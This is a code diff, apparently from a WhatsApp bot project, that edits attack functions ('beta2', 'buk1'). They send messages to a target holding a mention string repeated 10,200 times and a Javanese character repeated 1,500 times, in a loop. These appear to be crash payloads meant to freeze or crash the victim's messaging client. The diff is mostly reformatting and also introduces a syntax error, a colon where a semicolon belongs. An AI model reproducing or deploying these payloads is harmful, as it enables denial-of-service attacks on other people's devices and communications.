@@ -1,17 +1,17 @@
 exports.beta2 = async (viper, target, cct = true, Ptcp = true) => {
-    for (let i = 0; i < 3; i++) {
-const crypto = require('crypto')
-const fs = require('fs')
-const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
+const crypto = require('crypto');
+const fs = require('fs');
+const o = fs.readFileSync(`./database/lib/viper/o.jpg`);
 const jids = `_*~@13135550002~*_\n`.repeat(10200);
 const ui = 'ꦽ'.repeat(1500); 
-
-    await viper.relayMessage(target, {
-     ephemeralMessage: {
-      message: {
-       interactiveMessage: {
-        header: {
-         documentMessage: {
+    for (let i = 0; i < 3; i++) {
+    await viper.relayMessage(target,
+      { 
+        ephemeralMessage: {
+          message: {
+            interactiveMessage: {
+              header: {
+                documentMessage: {
           url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
           mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
           fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
@@ -234,10 +234,9 @@ ticket_id: crypto.randomBytes(16),
 
 exports.buk1 = async (viper, target, cct = true, Ptcp = true) => {
     try { 
-const crypto = require('crypto')
-const fs = require('fs')
-const o = fs.readFileSync(`./database/lib/viper/o.jpg`)
-
+const crypto = require('crypto');
+const fs = require('fs');
+const o = fs.readFileSync(`./database/lib/viper/o.jpg`):
 const message = {
             botInvokeMessage: {
                 message: {
